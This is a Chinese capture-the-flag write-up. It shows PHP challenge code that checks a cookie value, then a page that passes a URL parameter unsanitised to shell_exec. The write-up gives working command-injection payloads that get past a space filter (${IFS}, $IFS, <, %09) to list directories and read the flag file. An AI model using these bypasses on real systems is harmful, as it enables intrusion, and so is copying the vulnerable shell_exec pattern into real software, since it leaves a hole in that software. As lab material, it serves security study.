```
 <?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if($_COOKIE['admin']==1) 
{
    include "../next.php";
}
else
    echo "小饼干最好吃啦！";
?> 小饼干最好吃啦！
```

分析源码

判断Cookie中的admin的值弱类型比较是否为1

如果为真，则包含next.php



bp抓包，添加cookie

![image-20250403173016178](./assets/image-20250403173016178.png)

![image-20250403173023298](./assets/image-20250403173023298.png)



访问rasalghul.php

```
 <?php
error_reporting(0);
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/ /", $ip)){
      die('nonono');
  }
  $a = shell_exec($ip);
  echo $a;
}
?> 
```

分析源码

GET提交url

并将url的值赋值给变量ip

过滤空格

执行ip



```
?url=ls
```

![image-20250403173227110](./assets/image-20250403173227110.png)



读取根目录

利用${IFS}绕过空格

```
?url=ls${IFS}/
```

![image-20250403173301841](./assets/image-20250403173301841.png)



读取flllllaaaaaaggggggg

```
?url=cat${IFS}/flllllaaaaaaggggggg 
```

![image-20250403173329462](./assets/image-20250403173329462.png)





${IFS}$1也可以绕过空格

```
?url=cat${IFS}$1/flllllaaaaaaggggggg 
```

![image-20250403173352389](./assets/image-20250403173352389.png)





$IFS也可以

```
?url=cat$IFS/flllllaaaaaaggggggg 
```

![image-20250403173410267](./assets/image-20250403173410267.png)





<也可以

```
?url=cat</flllllaaaaaaggggggg 
```

![image-20250403173427967](./assets/image-20250403173427967.png)



%09也可以

```
?url=cat%09/flllllaaaaaaggggggg 
```

![image-20250403173458840](./assets/image-20250403173458840.png)